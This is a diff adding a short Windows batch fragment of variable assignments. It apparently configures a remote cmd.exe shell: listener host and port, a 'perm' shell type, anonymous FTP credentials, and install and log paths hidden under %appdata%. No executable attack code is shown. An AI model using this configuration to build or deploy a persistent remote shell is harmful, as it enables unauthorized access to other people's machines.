@@ -1,0 +1,13 @@
+set lhost=localhost
+set lport=5005
+set uport=21
+set uhost=localhost
+set prog=cmd.exe
+set shellt=perm
+set ftpuser=anonymous
+set ftppass=anonymous
+set shelloc=%appdata%
+set logdump=%appdata%\238\inslog.log
+set buildver=238
+set insdir=%appdata%\238
+set logdump=debug.txt
